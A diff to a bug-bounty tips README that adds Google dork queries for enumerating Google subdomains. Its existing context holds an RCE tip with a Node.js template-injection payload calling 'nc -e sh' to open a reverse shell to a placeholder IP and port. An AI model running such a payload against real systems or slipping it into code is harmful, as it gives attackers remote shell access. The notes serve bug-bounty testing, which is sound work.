@@ -1,6 +1,15 @@
 ![ ](https://raw.githubusercontent.com/rbih-boulanouar/bugbounty/main/images/Lets-Dig-into-the-Robust-Bug-Bounty-Program-Developed-by-Google.png)
 # General tips
 changing Exif metadata of an image can lead to XSS, RCE ...  [learn more](https://gokulvinesh.medium.com/rce-xss-via-image-exif-metadata-dddf33dadb41).
+
+# Recon
+Google Dorks for recon
+```
+site:*.google.*
+site:google.*
+site:*.google.com
+site:*.google.-*.* -> (good results)
+```
 # RCE
 1-If you discover a node.js template area, you should try triggerable node payload </br>
 `require('child_process').exec('nc -e sh ip port');{src:/bin/sh/}`
